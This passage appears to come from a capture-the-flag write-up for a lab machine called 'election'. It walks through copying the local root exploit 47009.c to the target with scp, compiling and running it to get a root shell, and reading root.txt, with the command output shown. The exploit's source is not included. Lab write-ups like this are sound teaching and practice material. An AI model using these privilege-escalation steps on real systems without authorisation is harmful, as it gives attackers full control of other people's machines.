Lets copy that onto the target server.
```
scp 47009.c love@$TARGETIP:/tmp/
```

Now jump back into our love ssh. Lets compile and run that exploit.

```
love@election:/tmp$ gcc 47009.c -o pe
love@election:/tmp$ ./pe
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(love)
opening root shell
#
```
It looks like we have a simple shell. Lets see if we inherited root.
```
# whoami
root
```
We could upgrade it, or get the ssh or create a user. But cause this is a ctf type thing and there was a User.txt lets now check if there is a root.txt.
```
# cd /          
# cd root       
# ls -la
total 44
drwx------  6 root root 4096 Sep  3  2021 .
drwxr-xr-x 24 root root 4096 Apr  8  2020 ..
-rw-------  1 root root   66 May 27  2020 .bash_history
drwx------  3 root root 4096 Apr  8  2020 .cache
drwx------  5 root root 4096 May 27  2020 .config
drwx------  3 root root 4096 Oct 20  2019 .gnupg
drwxr-xr-x  3 root root 4096 Oct 20  2019 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   33 Apr  9  2020 root.txt
-rw-r--r--  1 root root   66 Apr  2  2020 .selected_editor
-rw-r-----  1 root root    5 Sep  3 08:59 .vboxclient-display-svga.pid
# head -c 5 root.txt
5238f#
```
Boom we can read the file (only showing the first 5 chars here)
